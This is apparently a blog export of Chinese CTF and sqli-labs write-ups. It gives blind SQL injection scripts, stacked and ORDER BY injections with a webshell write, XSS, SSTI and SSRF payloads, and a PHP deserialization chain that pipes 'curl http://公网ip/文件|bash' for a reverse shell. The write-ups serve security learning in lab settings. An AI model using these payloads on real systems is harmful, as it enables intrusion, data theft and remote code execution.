总之盲注题的难点还是在找到注入点这一步上。 [GYCTF2020]Ezsqli这题其实上次无列名时已经写了一遍，但是当时的脚本是扒的，这次就自己写一个，具体原理可以参考我上次那篇无列名注入的博客。 123456789101112131415161718192021222324252627import requestsimport timeurl = &quot;http://1457e2ab-f8cd-42b7-b357-2f9db3f89820.node4.buuoj.cn:81/index.php&quot;payload = &#123;&quot;id&quot;: &quot;&quot;&#125;flag = &quot;&quot;for i in range(1, 150): time.sleep(0.06) low = 32 high = 128 mid = (low + high) &gt;&gt; 1 while low &lt; high: payload[&quot;id&quot;] = &quot;1^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i, mid) r = requests.post(url, data=payload) time.sleep(0.05) if &#x27;Nu1L&#x27; in r.text: low = mid + 1 else: high = mid mid = (low + high) &gt;&gt; 1 if (mid == 32 or mid == 127): break flag += chr(mid) print(flag)print(flag) 跑出来表名为“users233333333333333,f1ag_1s_h3r3_hhhhh”，接下来直接爆数据内容： 123456789101112131415161718192021222324252627282930import requestsimport timeurl = &#x27;http://1457e2ab-f8cd-42b7-b357-2f9db3f89820.node4.buuoj.cn:81/index.php&#x27;payload = &#123;&quot;id&quot;: &quot;&quot;&#125;flag = &#x27;&#x27;num = 0def add(result): res = &#x27;&#x27; res += result return resfor i in range (1,60): if (num == 1): break for j in range (32,127): time.sleep(0.06) s = add(flag + chr(j)) payload[&quot;id&quot;] = &#x27;1^((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))^1&#x27;.format(s) r = requests.post(url, data=payload) if &#x27;Nu1L&#x27; in r.text: flag += chr(j-1) print(flag) break if &#x27;&#125;&#x27; in r.text: num = 1 break 这里没有用二分法，调试的时候出了点问题，先用爆破代替下，等之后再改过来。这里的数据出来都是大写字母，flag要是小写字母，最后记得改过来就行了。 总结盲注的主要考点就那三个：注入点寻找、payload构建和脚本编写，基本与平常的sql注入题无异，主要是脚本要多写，善于找到问题，多用几种方式编写脚本。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql -python","slug":"web-mysql-python","permalink":"http://example.com/tags/web-mysql-python/"}]},{"title":"sqli-labs练习-less38-53","slug":"sqli-labs练习-less38-53","date":"2021-11-15T12:29:05.000Z","updated":"2021-11-19T14:52:32.356Z","comments":true,"path":"2021/11/15/sqli-labs练习-less38-53/","link":"","permalink":"http://example.com/2021/11/15/sqli-labs%E7%BB%83%E4%B9%A0-less38-53/","excerpt":"前言经过几个月的不懈奋战（，终于把靶场前三页全部刷完了，第四页都是挑战题，检验这个靶场的学习成果。最后也会总结sql注入的过程及方法。ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。","text":"前言经过几个月的不懈奋战（，终于把靶场前三页全部刷完了，第四页都是挑战题，检验这个靶场的学习成果。最后也会总结sql注入的过程及方法。ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。 less38-45关于堆叠注入sql注入的又一块拼图补上了，这块拼图就是堆叠注入。首先我们截取关键源码看一下： 123456789101112131415161718192021222324252627282930313233$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;/* execute multi query */if (mysqli_multi_query($con1, $sql))&#123; /* store first result set */ if ($result = mysqli_store_result($con1)) &#123; if($row = mysqli_fetch_row($result)) &#123; echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;; printf(&quot;Your Username is : %s&quot;, $row[1]); echo &quot;&lt;br&gt;&quot;; printf(&quot;Your Password is : %s&quot;, $row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125;// mysqli_free_result($result); &#125; /* print divider */ if (mysqli_more_results($con1)) &#123; //printf(&quot;-----------------\\n&quot;); &#125; //while (mysqli_next_result($con1));&#125;else &#123; echo &#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;; print_r(mysqli_error($con1)); echo &quot;&lt;/font&gt;&quot;; &#125; 我们注意到，源码使用了一个叫做mysqli_multi_query()的函数，这个函数一次可以执行多条sql语句，这就为堆叠注入创造了条件。 而所谓堆叠注入，就是写入多条payload，之间用分号分隔开。不过在实战中堆叠注入出现的可能性较小，因为使用条件还是十分苛刻的。而且堆叠注入产生的危害是十分之大的，会导致增删查改语句都可以实现，对数据库安全造成重大隐患。 我们就拿第38关来进行测试，构建payload： 1?id=1&#x27;;insert into users(id,username,password)values(99,&#x27;mrl64&#x27;,&#x27;yeah&#x27;) --+ 我们发现我们成功写入了一段数据，同理我们也可以把这个数据删去： 1?id=1&#x27;;delete from users where id=99 --+ 增删查改的所有语句只要没有被过滤都是还可以被执行的，这里不做具体演示了。 less38-41其实sqli-labs并没说有什么解除的目标，只是一个试炼场。如果一定要像之前的关卡一样爆出数据其实也很简单，直接联合注入、报错注入等等都是可以的，不过这里就出现了一种新的注入方式，参考payload： 1?id=-1&#x27; union select 1,2,database(); 这是由于mysqli_multi_query()函数的作用，识别到了我们构建的这句payload，因此被成功执行，而后面的语句也不会因为语法错误而爆错。 less38是单引号字符型注入，39关是整数型注入，40关是单引号字符型盲注，41关是整数型盲注。 less42-45这几关都是POST的题目，查看源码会发现username进行了过滤，因此我们要在password中进行注入，具体方法和前面几关是一样的。 less42是单引号字符型注入，less43是单引号括号注入，44关是单引号盲注，45关是单引号括号盲注。 less46-53order by排序这次源码中的查询语句变成了order by： 1$sql = &quot;SELECT * FROM users ORDER BY $id&quot;; 也许会有人感到疑惑，order by不是用来查列数的吗，怎么还能用来查询数据呢？但其实order by关键字的真正作用其实是对结果集按照一个列或者多个列进行排序，默认为升序(ASC)，可以通过关键字改变排序方式。完整的语法如下： 1SELECT column_name,column_name FROM table_name ORDER BY column_name,column_name ASC|DESC; 我们来跑几条语句试一试： 按id逆序排序：?sort=id desc 按username顺序排序：?sort=username [asc] 这就是order by的查询原理，但是我们发现order by后面不能跟联合查询语句，这就导致了之前很多注入方法无法使用。但是我们知道order by后面可以跟一个数字，这首先为我们做可能有的闭合创造了条件。 less46-49经过查询，我们得知了order by后可以使用limit、into outfile等语句，因此这里就有两种明显的思路：报错注入与webshell。 均以46关为例，首先是报错注入，构建payload： 1234?sort=1 and extractvalue(1,concat(0x7e,database(),0x7e))Welcome DhakkanXPATH syntax error: &#x27;~security~&#x27; 之前提到的报错注入方式全都是可以使用的 第二种方法是通过into outfile写入一句话木马并使用webshell进行连接，构建payload： 1?sort=1 into outfile &#x27;/var/www/html/sqli-labs-php7/1.php&#x27; 然后通过菜刀或者蚁剑等webshell工具进行连接，和less7基本一样，记住要注意权限问题。 当然盲注也是可以的。 less46是数字型注入，47关是单引号字符型注入，48关是数字型盲注，49关是单引号字符型盲注。 less50-53最后四关了，首先这几关本质上与46-49关几乎没差别，最大的区别就是使用了mysqli_multi_query()函数，因此存在堆叠注入，解题方法也可以通用less46-49的方法。 less50是数字型注入，51关是单引号字符型注入，52关是数字型盲注，53关是单引号字符型盲注。 总结到此为止sqli-labs的前3页已经全部结束了，第4页主要都是题目，用来训练sql注入，没有新的内容了。这里总结sql注入的过程及方法： 判断注入类型与过滤：首先找到能够实施注入的地方进行sql注入测试，使用and 1=1、rand(true)等方式判断注入类型是字符型还是数字型。在这步时可以初步确定空格、注释符、引号、or等是否被过滤。 判断注入方法：接着尝试构建不同的payload，例如联合注入的payload、报错注入的payload来判断应当选择的注入方式。例如没有报错回显排除报错注入，没有注入不同导致回显不同排除布尔盲注等，列名无法查询使用无列名注入等等。 构建payload或编写脚本：根据过滤情况、注入方式来构建payload实现sql注入，如果涉及盲注的还需要编写盲注脚本，最后成功获取我们想要的信息。 当然在实战中sql注入的难度都是相当大的，需要大量的实战经验来进行积累。接下来还有很多新东西在前面，让我们进入下个靶场继续磨炼。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"【极客大挑战2021】write up","slug":"【极客大挑战2021】write up","date":"2021-11-15T09:35:28.000Z","updated":"2021-12-06T11:17:18.278Z","comments":true,"path":"2021/11/15/【极客大挑战2021】write up/","link":"","permalink":"http://example.com/2021/11/15/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982021%E3%80%91write%20up/","excerpt":"前言2021的极客大挑战结束了，题目还是挺有意思的，也粗略认识学习了很多新东西，web做了11题出来，都大致写下思路吧。","text":"前言2021的极客大挑战结束了，题目还是挺有意思的，也粗略认识学习了很多新东西，web做了11题出来，都大致写下思路吧。 Write UpWelcome2021进入网页后一串hint，得知这关考察的是html的知识，那我们先查看网页源码，发现提示要用WELCOME请求方法来请求网页，那我们抓包然后改变请求方法： 下一步是去f1111aaaggg9.php，记得保持WELCOME请求方法，访问就可以了： Dark题目给的URL是一个onion结尾的链接，这就意味着我们需要一个Tor浏览器和魔法上网工具，这些东西只能自己动手丰衣足食了，用洋葱浏览器打开链接查看源码获得flag： babyphp进入网页没有什么有效信息，查看源码发现提示我们查看robots，发现藏了一个noobcurl.php，进入之后是一段源代码： 1234567891011121314151617&lt;?phpfunction ssrf_me($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); curl_close($ch); echo $output;&#125;if(isset($_GET[&#x27;url&#x27;]))&#123; ssrf_me($_GET[&#x27;url&#x27;]);&#125;else&#123; highlight_file(__FILE__); echo &quot;&lt;!-- 有没有一种可能，flag在根目录 --&gt;&quot;;&#125; 一段curl代码，不出意外这就是题php文件包含题了，再结合提示flag在根目录中，直接构建payload： 1?url=file:///flag 得到flag： 蜜雪冰城甜蜜蜜要求我们点出第九杯饮料，然而下面菜单只有8杯饮料，f12查看发现菜单的每瓶饮料都对应了一个id，第一杯就是1，那么我们把这个id改成9，再点击菜单上的那杯饮料就可以了： 雷克雅未克进网页浏览一遍，其他都是虚的，只有中间这几行是重要的： 这一看就是伪造xff，但是这个经纬度是什么意思呢，点击一下检测位置抓个包看看： 好嘛，原来经纬度就是cookie中的数据，那我们用网站给的经纬度查询查出经纬度并代入cookie中，再伪造xff，得到一串奇奇怪怪的东西： 一般这种奇奇怪怪的东西放在控制台里跑都会有惊喜出现： babyxss关于xss具体原理等等等之后刷DVWA再具体细说，这里就简单讲下解法。 第一种解法，由于我们发现alert被过滤了，那么我们可以使用Data URI，插入一个html文档来进行注入： 1&lt;/script&gt;&lt;script src=data:text/html,%61%6c%65%72%74(1)&gt; 第二种解法，有点魔幻，我也不会解释，就直接给payload以及链接了： 1&quot;+[][(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]][(&#x27;&#x27;+&#123;&#125;)[5]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+&#123;&#125;[0])[1]+(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[2]+(&#x27;&#x27;+&#123;&#125;)[5]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+!0)[1]]((&#x27;&#x27;+!1)[1] + (&#x27;&#x27;+!1)[2] + (&#x27;&#x27;+!1)[4] +(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]+&quot;(1)&quot;)())// 上述payload分析 两种解法都可以得到flag： babypy一题flask SSTI漏洞题，做题时简单学习了下，具体原理可以参考这篇博客：flask SSTI漏洞 直接讲题，首先获取基本类，这里用mro试了好像不行，因此用base来进行注入： 1&#123;&#123;&#123;&#125;.__class__.__bases__[0]&#125;&#125; 获得基本类名只有一个object，接下来获取其子类： 1&#123;&#123;&#123;&#125;.__class__.__bases__[0].__subclasses__()&#125;&#125; 可以发现这个子类是相当的多啊，，但其实关键的也就那几个，搜索一番其中有一个叫warnings.catch_warnings，首先我们要定位这个子类的位置，这题不能直接通过命令获取，那我们就大致判断缩小范围，最后锁定位置是208。接着直接构建命令拿到flag： 1&#123;&#123;&#123;&#125;.__class__.__bases__[0].__subclasses__()[208].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125; babyPOPphp反序列化的题目。代码审计一遍： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?phpclass a &#123; public static $Do_u_like_JiaRan = false; public static $Do_u_like_AFKL = false;&#125;class b &#123; private $i_want_2_listen_2_MaoZhongDu; public function __toString() &#123; if (a::$Do_u_like_AFKL) &#123; return exec($this-&gt;i_want_2_listen_2_MaoZhongDu); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125;class c &#123; public function __wakeup() &#123; a::$Do_u_like_JiaRan = true; &#125;&#125;class d &#123; public function __invoke() &#123; a::$Do_u_like_AFKL = true; return &quot;关注嘉然,&quot; . $this-&gt;value; &#125;&#125;class e &#123; public function __destruct() &#123; if (a::$Do_u_like_JiaRan) &#123; ($this-&gt;afkl)(); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125;if (isset($_GET[&#x27;data&#x27;])) &#123; unserialize(base64_decode($_GET[&#x27;data&#x27;]));&#125; else &#123; highlight_file(__FILE__);&#125; 具体分析：我们发现能够获取flag文件的只有exec()函数，而要触发则需要a::$Do_u_like_AFKL为true，在类d中的__invoke()方法可以做到这点。__invoke()会在脚本尝试将对象调用为函数时触发，我们在类e中找到了这一触发方式，因为我们在类c中使得a::$Do_u_like_JiaRan；所以只要在类e中使$afkl=new d()即可。而类c是一个__wakeup()方法，因此我们反序列化的对象应该就是类c。同时类b是一个__toString()方法，一个对象被当作字符串使用时触发,这个方法在类d中被发现。 这就都对上了，接下来构建payload。在类d中将$this-&gt;value赋值为类b的实例化对象即可输出类b，但d中没有$value变量，因此我们自己创造一个。接着调用d类，在类e中使$afkl=new d()即可。最后将类c和类e连接，在类c中构造一个变量，使他的值为new e()即可。 而由于exec()无回显，因此需要进行反弹shell。 最后payload： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?phpclass a &#123; public static $Do_u_like_JiaRan = false; public static $Do_u_like_AFKL = false;&#125;class b &#123; private $i_want_2_listen_2_MaoZhongDu; public function __construct() &#123; $this-&gt;i_want_2_listen_2_MaoZhongDu=&quot;curl http://公网ip/文件|bash&quot;; &#125; public function __toString() &#123; if (a::$Do_u_like_AFKL) &#123; return exec($this-&gt;i_want_2_listen_2_MaoZhongDu); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125;class c &#123; public $b; public function __wakeup() &#123; a::$Do_u_like_JiaRan = true; &#125;&#125;class d &#123; public $value; public function __invoke() &#123; a::$Do_u_like_AFKL = true; return &quot;关注嘉然,&quot; . $this-&gt;value; &#125;&#125;class e &#123; public $afkl; public function __destruct() &#123; if (a::$Do_u_like_JiaRan) &#123; ($this-&gt;afkl)(); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125;$c=new c();$e=new e();$d=new d();$b=new b();$b-&gt;value=$b;$d-&gt;value=$b;$e-&gt;afkl=$d;$c-&gt;b=$e;echo base64_encode(serialize($c)); 将输出结果get进网页，进行反弹shell，得到flag： Baby_PHP_Black_Magic_Enlightenment进入网页先进行代码审计：GET进一个password，这个值要大于9999但不能是个数字，这种题做过很多次了，password=10000a就可以了。但是发现虽然显示了”How’s that possible”，但是页面却没有回显2.php的内容，可能是被注释了，f12查看发现确实如此： 前往下一步，又是一串代码，审计一遍发现意思是GET一个user和一个pass，两者的内容不能一致但是sha1加密后的值要相等，这里利用sha1函数与md5函数共有的漏洞，以数组的方式进行检测： 1?user[0]=123&amp;pass[1]=123 这样我们就成功进入了下一关baby_revenge.php，这次也是sha1产生的hash碰撞，但是数组被过滤掉了，看起来这次是碰到硬茬了。但是在我查找资料的时候，找到了这么一篇博客：关于SHA1碰撞——比较两个binary的不同之处这篇博客的内容相当的厉害，里面提到了google出两个SHA1值相同而不一样的pdf文件并利用了这两个文件进行hash碰撞，我们直接构造这个payload得到下一个文件here_s_the_flag.php： 这是最后一关了，我们要GET一个id进去，要求id进行一次url解码后要是字符串”Longlone”，但是id中不能检测到”Longlone”。这一关其实也很简单，因为网页在读取时会先进行一次url解码，接着代码中会再次进行一次，因此我们将这个字符串进行两次url编码就可以了。 babysql最简单的sql注入了，POST类型。直接用sqlmap跑就能出来了。手工注入我测试出来了联合注入，盲注等等都可以，报错注入由于无回显因此不能使用。这里就跑个sqlmap吧： 12345678910111213141516171819202122232425262728293031323334353637383940414243python2 sqlmap.py -r 1.txt --dbsavailable databases [6]:[*] babysql[*] flag[*] information_schema[*] mysql[*] performance_schema[*] testpython2 sqlmap.py -r 1.txt -D flag --tablesDatabase: flag[1 table]+-------+| fllag |+-------+python2 sqlmap.py -r 1.txt -D flag -T fllag --columnsDatabase: flagTable: fllag[2 columns]+-----------+--------------+| Column | Type |+-----------+--------------+| fllllllag | varchar(100) || wlz | varchar(100) |+-----------+--------------+python2 sqlmap.py -r 1.txt -D flag -T fllag -C fllllllag --dumpDatabase: flagTable: fllag[1 entry]+------------------------+| fllllllag |+------------------------+| SYC&#123;U_4N0vv_Sql_Noyv~&#125; |+------------------------+ anothersql这题就存在着一定的过滤了，联合查询不能用，updatexml和extractvalue也是被过滤了，但是floor，没有被过滤，用floor过滤就可以了： 123456789101112131415161718admin&#x27; and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)#Duplicate entry &#x27;true____flag1&#x27; for key &#x27;&lt;group_key&gt;&#x27;admin&#x27; and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;true____flag&#x27;),floor (rand(0)*2))x from information_schema.tables group by x)a)#Duplicate entry &#x27;syclover1&#x27; for key &#x27;&lt;group_key&gt;&#x27;admin&#x27; and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;true____flag&#x27; and table_name=&#x27;syclover&#x27;),floor (rand(0)*2))x from information_schema.tables group by x)a)#Duplicate entry &#x27;id,uname,pwd,flag1&#x27; for key &#x27;&lt;group_key&gt;&#x27;admin&#x27; and (select 1 from (select count(*),concat((select concat(flag) from syclover limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)#Duplicate entry &#x27;SYC&#123;U_4N0vv_3rR0r_Inj3c410n&#125;1&#x27; for key &#x27;&lt;group_key&gt;&#x27; 总结这次比赛还是见识了很多新玩意儿的，以后刷靶场的时候可以进行拓展，也巩固了已有的只是，继续努力。","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf -web","slug":"ctf-web","permalink":"http://example.com/tags/ctf-web/"}]},{"title":"【2021深育杯】misc-login write up","slug":"【2021深育杯】misc-login-write-up","date":"2021-11-13T11:02:51.000Z","updated":"2021-12-06T11:16:15.677Z","comments":true,"path":"2021/11/13/【2021深育杯】misc-login-write-up/","link":"","permalink":"http://example.com/2021/11/13/%E3%80%902021%E6%B7%B1%E8%82%B2%E6%9D%AF%E3%80%91misc-login-write-up/","excerpt":"前言别问为什么一个web手写了个misc的题，问就是web根本不会。这次比赛连签到题全队做了3题，并列70-80名那一带。","text":"前言别问为什么一个web手写了个misc的题，问就是web根本不会。这次比赛连签到题全队做了3题，并列70-80名那一带。 write up直接上题吧。首先进去是个网页，要我们进行一个陆的登，当然我们既不知道账号也不知道密码，那我们就点击获取实例进去，发现跳转到一个新的网页，我们可以通过获取提示文档来获得一个example.zip。虽然网页怂恿我们把其中的内容发送到一个邮箱里，但hint告诉我们此乃谎言。 打开zip发现是加密文档，但是有一点很奇怪，就是zip内有一个示例.txt和一个该文件的副本，我们合理怀疑这里有个伪加密，因此我们备份一个文件，然后拿example.zip扔进ZipCenOp里跑一下： 1java -jar ZipCenOp.jar r example.zip 果然我们发现这个副本文件是伪加密，跑完ZipCenOp后打开example.zip就可以直接将副本文件解压出来了。解压出来后就是明文破译zip密码了，这里压缩副本文件时一定要用winrar，否则明文破译会失败。 我们用AZPR来跑：密码是qwe@123 这样password.zip就被我们解压出来了，点开之后发现又是加密文档，不过这回的文档里是一个swp文件和3个大小为6的txt文件，CRC32又是已知的（分别为0x21137233；0x4B8F7BE7；0x1028C889)，很容易判断出来我们要对这三个txt进行CRC碰撞，这里我们用crc32 tools进行crc碰撞，如果大小超过6位这个脚本就不能用了。 碰撞结果： 我们这里分析拼接，得到zip的密码应该是welc0me_sangforctf，解压出.password.swp，用010Editor打开文件，翻到最后，发现这么几行： 这就是我们的账号和密码了，我们直接用账号和密码登录，网页也提示我们成功找到了flag，可是我们发现f12和鼠标右键被禁用了，因此我们需要在登录前就提前打开f12，再进行登陆，终于找到了flag： 总结这次比赛我明白了几个道理： web不是人能做的 带easy的题目是最难的 不务正业也挺快乐的（bushi 下周极客大挑战结束再写一份wp，这周划了。","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf -misc","slug":"ctf-misc","permalink":"http://example.com/tags/ctf-misc/"}]},{"title":"sql无列名注入与作业wp","slug":"sql无列名注入与作业wp","date":"2021-11-11T09:08:46.000Z","updated":"2021-12-01T08:28:17.197Z","comments":true,"path":"2021/11/11/sql无列名注入与作业wp/","link":"","permalink":"http://example.com/2021/11/11/sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E4%B8%8E%E4%BD%9C%E4%B8%9Awp/","excerpt":"前言实训室讲了mysql的联合查询注入与无列名注入，因为联合查询做靶场就写过了，这里就专门解析无列名注入，并且写下布置的作业wp。","text":"前言实训室讲了mysql的联合查询注入与无列名注入，因为联合查询做靶场就写过了，这里就专门解析无列名注入，并且写下布置的作业wp。 无列名注入从实战中开始讲起。以[极客大挑战]Lovesql为例，这题直接联合查询也是可以的，跑sqlmap也是可以的，但这就很没意思了。因此我们用无列名注入来解题(order by跑出来有3列，且2,3列可显)。 首先，我们考虑使用无列名注入的条件是information_schema这个数据库被过滤了，导致我们无法使用联合注入。在高版本的mysql中，我们可以使用mysql.innodb_table_stats或者sys.schema_auto_increment_columns等等来获取表名，这里我们构造第一句payload： 1111&#x27; union select 1,(select group_concat(table_name) from mysql.innodb_table_stats),3 # 获取表名之后，由于无法获得字段名，因此我们编写无列名注入的payload： 1111&#x27; union select 1,2,(select `3` from (select 1,2,3 union select * from l0ve1ysq1)a)# 来分析一下这段payload，首先整体上还是一个联合查询语句，但是区别于平常的联合查询，这里原本用来查询列名的语句被替换成了不使用列名进行查询的无列名注入语句。无列名注入的原理简单来说就是将我们不知道的列名先取一个别名，同时进行数据查询。 具体的原理解析可以参考这条链接的内容：mysql无列名注入 这样我们就不难看出，这句payload起到的作用就是将1,2,3三个数字对应了数据表中的1,2,3列，并同时对第三列进行查询。最后一个字母a相当于一个名字，可以使用任意字符代替。 在实战中，反引号是基本上不会放出来的（当然这题没有被过滤），因此我们可以采用别名法带入的方式避免payload中出现反引号： 1111&#x27; union select 1,2,(select t from (select 1,2,3 as t union select * from l0ve1ysq1)a)# 我们将t这个别名赋予了3，这样上面的两句payload是完全等价的。在注入过程中发现返回值超过一行，使用limit语句一个个注入，最后发现下面这句payload得到了flag： 1111&#x27; union select 1,2,(select `3` from (select 1,2,3 union select * from l0ve1ysq1 limit 16,1)a)# 具体学习无列名注入，除了上面的那个链接外，还可以通过下面这个链接进行具体学习：Bypass information_schema与无列名注入 [GYCTF2020]Ezsqli write up一进网页就是孙笑川的大脸，还有懒得做前端的师傅的疯狂吐槽。这都不重要，重要的是最下面的数据查询，我们先判断注入方式。但是当我输入进1’进入时，它回显了一个bool(false)，我觉得有点不对劲，马上拿出了异或注入进行测试，结果我发现我被偷袭了。 这题还是道盲注题！当我注入1^1^1时，回显为“Nu1L”，而注入1^0^1时，回显的是“Error Occured When Fetch Result.”。而且经过测试，or被过滤了，因此我们还需要采用无列名注入的方式进行注入。 先测试了下database()的长度应该是21：好家伙这数据库名这么长，那只能跑脚本了，由于还没有脚本经验，因此就大概写下payload的构建。 首先是爆表： 11^ascii(substr((select group_concat(table_name) from mysql.innodb_table_stats where table_schema=database()),1,1))=103^1 由于information_schema被过滤，因此我们使用mysql.innodb_table_stats来查表名，这句payload就是句很平常的布尔盲注，表格的名称是“f1ag_1s_h3r3_hhhhh”。 接着要查询数据，我们构建一个这样的payload： 11^((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh)).format(flag)^1 这句payload的原理是将大于号左右两边的字符串进行比较，如果左边较大则返回1，否则返回0，这样我们就可以判断。要注意字段数，如果查询失败应该更改左边的字段数并再次进行注入。 详细分析下这段payload，就是将f1ag_1s_h3r3_hhhhh表中的数据内容的ascii码值与“flag”的ascii值相比（format将前面的{}替换成”flag”），这样一步步就可以将flag跑出来了。 当然，由于这里用的是＞号，因此脚本中要将输出的字符减1，因为判断成功时花括号内的字符是比实际内容大1的。 最后偷一个大佬的脚本吧： 1234567891011121314import requestsflag=&#x27;&#x27;url=&#x27;http://ca5cdac5-e97e-42df-9ed0-233bc75b4c4d.node3.buuoj.cn/index.php&#x27;for i in range(1,50): for j in range(33,127): payload = &quot;1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;&quot; data=&#123; &#x27;id&#x27;: payload &#125; r=requests.post(url,data=data) if &#x27;Nu1L&#x27; in r.text: flag=flag+chr(j) print(flag) break 爆表脚本 12345678910111213141516import requestsurl = &#x27;http://6c05130d-3668-41d6-9ad6-5e69ce00e0cc.node3.buuoj.cn/index.php&#x27;x=&#x27;&#x27;for j in range(1,50): for i in range(33,127): flag=x+chr(i) payload = &quot;1&amp;&amp;((1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;.format(flag) data=&#123; &#x27;id&#x27;:payload &#125; r = requests.post(url,data=data) if &#x27;Nu1L&#x27; in r.text: x=x+chr(i-1) print(x) break 爆数据脚本 总结sql注入又一块拼图补上了，接下来就是继续刷题刷靶场的时间了。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"sqlmap使用练习","slug":"sqlmap使用练习","date":"2021-11-06T01:14:59.000Z","updated":"2021-12-01T08:28:26.224Z","comments":true,"path":"2021/11/06/sqlmap使用练习/","link":"","permalink":"http://example.com/2021/11/06/sqlmap%E4%BD%BF%E7%94%A8%E7%BB%83%E4%B9%A0/","excerpt":"前言手动进行SQL注入效率还是没有工具高啊，掌握对工具的使用可以帮助我们提高效率。先以sqli-labs基础篇为例学习sqlmap基础功能。","text":"前言手动进行SQL注入效率还是没有工具高啊，掌握对工具的使用可以帮助我们提高效率。先以sqli-labs基础篇为例学习sqlmap基础功能。 GET型注入联合查询less1-4注入都是很相似的，我们就以第一关为例。我们可以先检测注入方式：python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 --dbms --batch -u：指定url –batch: 执行过程中不需要用户输入YES or NO，将会使用sqlmap提示的默认值YES一直运行下去。推荐都可以添加进 –dbms：指定数据库 结果如下：系统给出了四种注入方式，分别是布尔盲注、报错注入、时间盲注和联合查询，我们也可以从payload看出这题是基于单引号的错误进行注入。 接下来我们开始进行注入，下面介绍如何一步步从数据库查到表格中的数据： –dbs：爆出所有数据库名称 –current-db：获取当前数据库名称 -D database_name –tables：获取指定数据库中的表名 -D database_name -T table_name –columns：获取指定表格的列名 -D database_name -T table_name -C cname1[,cname2,cname3…] –dump：获取指定列的数据 结果如下：python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 --dbs python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 -D security --tables python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 -D security -T users --columns python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-1/?id=1 -D security -T users -C id,username,password --dump 报错注入&amp;盲注其实直接用上面的语句也是可以的，但是这时我们会发现，sqlmap的注入用时大大延长，这是因为sqlmap检测到了多种注入方法，然后一个一个跑下来，等到成功了再返回结果，因此介绍如何指定过滤方法： –technique X：指定注入技术，支持5种形式，根据不同方法指定X的值（指定多个也可以，例如要指定报错和时间盲注就是ET） 12345B:Boolean-based-blind （布尔型型注入）E:Error-based （报错型注入）U:Union query-based （联合注入）S:Starked queries （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）T:Time-based blind （基于时间延迟注入，默认5秒） 盲注时，为了提高效率，我们也可以设置最大并发线程： –threads：最大并发线程，盲注时每个线程获取一个字符，获取完成后线程结束，默认为1，建议不要超过10 这样可以大大提高注入效率。 POST型注入针对POST型注入有两种方式。 –data：添加数据段 例如：python sqlmap.py -u http://127.0.0.1/sqli-labs-php7/Less-11 --data &quot;uname=1 &amp;passwd=1 &amp;submit=Submit&quot; --dbs 当然我们一般不这样做，因为这样构造比较麻烦，我们一般使用burp 